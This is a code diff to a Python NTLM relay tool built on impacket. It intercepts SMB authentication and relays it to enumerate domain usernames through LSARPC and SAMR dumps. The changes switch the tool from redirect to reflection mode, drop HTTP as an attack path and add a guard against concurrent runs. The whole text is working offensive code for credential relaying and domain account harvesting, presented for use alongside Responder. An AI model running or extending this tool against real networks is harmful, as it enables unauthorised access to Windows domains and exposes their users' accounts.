@@ -17,7 +17,7 @@ from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.smbconnection import SMBConnection
 
-got_usernames = False
+getting_usernames = False
 
 
 class SMBAttack(Thread):
@@ -31,7 +31,10 @@ class SMBAttack(Thread):
         self.config = config
 
     def run(self):
-        global got_usernames
+        global getting_usernames
+        if getting_usernames:
+            return
+        getting_usernames = True
         rpctransport = transport.SMBTransport(self.__SMBConnection.getRemoteHost(), filename=r'\lsarpc',
                                               smb_connection=self.__SMBConnection)
         dce = rpctransport.get_dce_rpc()
@@ -107,8 +110,6 @@ class SMBAttack(Thread):
         if in_domain:
             # Only works if we are relaying to a domain member
             SAMRDump().dump(self.__SMBConnection)
-
-        got_usernames = True
 
 
 class SAMRDump:
@@ -306,7 +307,7 @@ class SAMRDump:
 
 if __name__ == '__main__':
     RELAY_SERVERS = (SMBRelayServer,HTTPRelayServer)  # TODO: Maybe fix HTTP redirects later
-    ATTACKS = {'SMB': SMBAttack, 'HTTP': SMBAttack}
+    ATTACKS = {'SMB': SMBAttack}
 
     parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
     parser.add_argument('--target', '-t', metavar='TARGET', required=True, help='An IP address value that states which '
@@ -337,7 +338,7 @@ if __name__ == '__main__':
         c.setOutputFile(args.out_file)
         c.setSMB2Support(True)
         c.setInterfaceIp('')
-        c.setMode('REDIRECT')
+        c.setMode('REFLECTION')
         c.setRedirectHost(True)
 
         s = server(c)
@@ -347,7 +348,7 @@ if __name__ == '__main__':
     print ""
     logging.info("Servers started, waiting for connections")
     try:
-        while not got_usernames:
+        while not getting_usernames:
             sleep(1)
     except KeyboardInterrupt:
         logging.info("Exiting... Remember to stop Responder if you need to")
